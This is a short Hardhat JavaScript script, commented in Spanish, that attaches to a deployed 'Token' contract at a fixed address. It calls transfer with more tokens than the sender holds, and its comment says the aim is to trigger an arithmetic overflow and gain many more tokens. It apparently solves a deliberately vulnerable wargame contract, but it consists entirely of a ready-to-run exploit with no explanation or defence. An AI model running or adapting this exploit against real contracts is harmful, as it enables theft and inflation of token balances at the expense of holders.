const { Wallet } =  require("ethers");
const { ethers } =  require("hardhat");

const CONTRACT_NAME = "Token";
const CONTRACT_ADDRESS = "0x5E86D75897D490e365F1D2c1CC6Ee4c1FB49F09A";

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  // attach para interactuar con un contrato ya deployado
  const contract = factory.attach(CONTRACT_ADDRESS);

  // enviamos mas tokens que nos dan para causar desbordamiento y tener muchos mas tokens
  const tx = await contract.transfer(Wallet.createRandom().address, 26);
  await tx.wait();
 
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});